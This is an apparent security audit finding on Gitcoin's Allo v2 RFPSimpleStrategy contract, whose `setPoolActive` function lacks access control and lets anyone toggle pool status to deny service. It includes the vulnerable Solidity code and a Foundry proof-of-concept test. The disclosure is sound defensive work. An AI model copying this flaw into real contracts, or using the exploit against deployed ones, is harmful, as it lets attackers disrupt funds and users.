# M-03 Potential DoS due to missing access control on `setPoolActive` in the RFPSimplestrategy contract.
## Summary
The missing access control on the `setPoolActive` can cause DoS of contract.
## Impact
Anyone can set to Pool to be active or inactive at any time allowing for DoS or function calls which should not be allowed.
## Vulnerability Detail
Confirmed with sponsor, there should be access control on the function. The duration of the attack may be continuous as there may be malicious MEV Bots that would front-run calls and switch the contract active status based on function selectors. This would effectively render all major functions of the contract unusable, eg. `register`,`allocate`, `withdraw` and `distribute` as they require certain active states in the contract.

## Code Snippet
https://github.com/sherlock-audit/2023-09-Gitcoin/blob/main/allo-v2/contracts/strategies/rfp-simple/RFPSimpleStrategy.sol#L216-L222

```solidity
/// @notice Toggle the status between active and inactive.
    /// @dev 'msg.sender' must be a pool manager to close the pool. Emits a 'PoolActive()' event.
    /// @param _flag The flag to set the pool to active or inactive
    function setPoolActive(bool _flag) external {
        _setPoolActive(_flag);
        emit PoolActive(_flag);
    }
```

## PoC
Copy/Paste this test function in the `RFPSimpleStrategy.t.sol` file in the `test/foundry/strategies/` directory:
```solidity
function test_setActivebyAnyone() public {
        RFPSimpleStrategy testStrategy = new RFPSimpleStrategy(address(allo()), "RFPSimpleStrategy");
        vm.startPrank(address(allo()));
        testStrategy.initialize(1337, abi.encode(maxBid, useRegistryAnchor, metadataRequired));
        console.log("[+] testStrategy is initialized");
        console.log("[+] Current active status of testStrategy : ", testStrategy.isPoolActive());
        vm.stopPrank();
        vm.startPrank(address(9999999999999999999999));
        console.log("[+] Call the setPoolActive to false with: ");
        console.log("    vm.startPrank of random addess address(9999999999999999999999)");
        testStrategy.setPoolActive(false);
        vm.stopPrank();
        console.log("[+] Current active status of testStrategy : ", testStrategy.isPoolActive());

    }
```

## Recommendation
Add modifier to limit which callers can call the function and at which stages.
